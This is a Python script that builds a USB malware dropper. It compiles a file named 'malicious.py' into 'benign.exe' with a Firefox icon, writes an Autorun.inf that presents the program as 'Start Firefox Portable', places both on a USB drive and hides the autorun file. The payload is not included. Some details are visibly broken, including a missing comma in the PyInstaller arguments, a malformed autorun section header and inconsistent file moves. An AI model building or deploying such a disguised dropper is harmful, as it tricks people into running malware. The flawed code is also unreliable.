import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = "X:"
usbdir = os.path.join(pwd,"USB")
if os.path.isfile(exename):
    os.remove(exename)
    
# create executable from Python script
PyInstaller.__main__.run([
    "malicious.py"
    "--onefile",
    "--clean",
    "--log-level=ERROR",
    "--name="+exename,
    "--icon="+icon
])

# clean up after PyInstaller
shutil.move(os.path.join(pwd,"dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

# create AutoRun File
with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open="+exename+"\n")
    o.write("Action=Start Firefox Portable\n")
    o.write("Label=My USB\n")
    o.write("Icon="+exename+"\n")
    
# Move files to USB and set hidden
shutil.move(exename,usbdir)
shutil.move("Autorun.inf",usbdir)
os.system("attrib +h \""+os.path.join(usbdir,"Autorun.inf")+"\"")
